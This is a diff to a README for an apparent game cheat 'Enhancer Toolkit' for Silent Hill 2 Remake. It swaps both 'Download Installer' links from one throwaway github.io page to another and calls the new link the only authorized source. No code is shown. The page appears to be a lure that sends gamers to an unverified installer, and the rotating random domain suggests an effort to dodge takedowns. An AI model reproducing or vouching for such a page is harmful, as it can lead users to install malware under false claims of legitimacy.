@@ -2,7 +2,7 @@
 
 Welcome to the Silent Hill 2 Remake Enhancer Toolkit, the ultimate enhancement suite for your gaming experience in 2026. This toolkit provides a comprehensive set of features to customize and enhance your gameplay, including God Mode, Infinite Ammo, One Hit Kill, and more. Designed for Windows 10 and 11, it ensures a seamless and enhanced gaming session.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -69,7 +69,7 @@ A: It is advisable to disable the toolkit features before updating the game to p
 
 To get the latest version of the Silent Hill 2 Remake Enhancer Toolkit, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This is the only authorized source for downloading the toolkit. Ensure you download from this link to avoid any unauthorized versions.
 
